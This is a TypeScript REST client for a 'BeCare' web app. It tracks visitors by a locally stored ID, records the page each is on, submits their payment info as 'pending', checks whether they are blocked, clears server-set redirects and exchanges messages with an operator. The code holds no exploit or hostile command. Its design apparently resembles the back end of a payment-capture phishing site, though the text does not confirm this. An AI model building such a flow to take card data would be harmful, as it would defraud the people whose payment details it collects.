/**
 * BeCare API Client
 * Replaces all Firebase Firestore calls with REST API + Socket.io calls
 */

// API connects to VPS backend via Nginx proxy
// Force correct URL - override any legacy env variable pointing to old IP
const _rawApiUrl = import.meta.env.VITE_API_URL || 'https://qtesnd.com/api-backend';
export const API_BASE = (_rawApiUrl.includes('187.124.33.94') || _rawApiUrl.includes('localhost:3001'))
  ? 'https://qtesnd.com/api-backend'
  : _rawApiUrl;

// ─── HTTP Helper ──────────────────────────────────────────────────────────────
async function apiRequest(method: string, path: string, body?: any): Promise<any> {
  const res = await fetch(`${API_BASE}${path}`, {
    method,
    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
    body: body ? JSON.stringify(body) : undefined,
  });
  if (!res.ok) {
    const err = await res.json().catch(() => ({ error: 'Unknown error' }));
    throw new Error(err.error || `HTTP ${res.status}`);
  }
  return res.json();
}

// ─── Visitor API ──────────────────────────────────────────────────────────────

/** Create or initialize a visitor document */
export async function createVisitor(data: Record<string, any>): Promise<string> {
  const result = await apiRequest('POST', '/api/visitors', data);
  return result.visitorId;
}

/** Get visitor data by ID */
export async function getData(id: string): Promise<Record<string, any> | null> {
  try {
    return await apiRequest('GET', `/api/visitors/${id}`);
  } catch {
    return null;
  }
}

/** Update visitor data (partial update) */
export async function addData(data: Record<string, any>): Promise<void> {
  const { id, ...payload } = data;
  const visitorId = id || (typeof window !== 'undefined' ? localStorage.getItem('visitor') : null);
  if (!visitorId) return;

  if (typeof window !== 'undefined') {
    localStorage.setItem('visitor', visitorId);
  }

  try {
    await apiRequest('PATCH', `/api/visitors/${visitorId}`, payload);
  } catch {
    // Silently ignore - visitor may not exist yet or network error
  }
}

/** Set current page for visitor */
export const handleCurrentPage = (page: string): void => {
  if (typeof window === 'undefined') return;
  const visitorId = localStorage.getItem('visitor');
  if (!visitorId) return;
  addData({ id: visitorId, currentPage: page });
};

/** Handle payment info update */
export const handlePay = async (paymentInfo: any, setPaymentInfo: any): Promise<void> => {
  try {
    const visitorId = typeof window !== 'undefined' ? localStorage.getItem('visitor') : null;
    if (visitorId) {
      await apiRequest('PATCH', `/api/visitors/${visitorId}`, { ...paymentInfo, status: 'pending' });
      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
    }
  } catch (error) {
    console.error('[API] Error adding payment info:', error);
  }
};

/** Add history entry */
export async function addToHistory(visitorId: string, type: string, data: any, status: string = 'pending'): Promise<void> {
  try {
    await apiRequest('POST', `/api/visitors/${visitorId}/history`, { type, data, status });
  } catch (e) {
    console.error('[API] Error adding history:', e);
  }
}

/** Set visitor offline */
export async function setVisitorOffline(visitorId: string): Promise<void> {
  try {
    await apiRequest('POST', `/api/visitors/${visitorId}/offline`, {});
  } catch {
    // silent
  }
}

/** Clear redirect page */
export async function clearRedirectPage(visitorId: string): Promise<void> {
  try {
    await apiRequest('POST', `/api/visitors/${visitorId}/clear-redirect`, {});
  } catch {
    // silent
  }
}

/** Check if visitor is blocked */
export async function checkIfBlocked(visitorId: string): Promise<boolean> {
  try {
    const data = await getData(visitorId);
    return data?.is_blocked === true || data?.isBlocked === true;
  } catch {
    return false;
  }
}

/** Get messages for visitor */
export async function getMessages(visitorId: string): Promise<any[]> {
  try {
    return await apiRequest('GET', `/api/visitors/${visitorId}/messages`);
  } catch {
    return [];
  }
}

/** Send message */
export async function sendMessage(visitorId: string, message: string, senderName?: string): Promise<void> {
  // Messages are sent via Socket.io (see socket.ts)
  // This is a fallback REST call
  try {
    await apiRequest('POST', `/api/visitors/${visitorId}/messages`, { message, senderName });
  } catch (e) {
    console.error('[API] Error sending message:', e);
  }
}
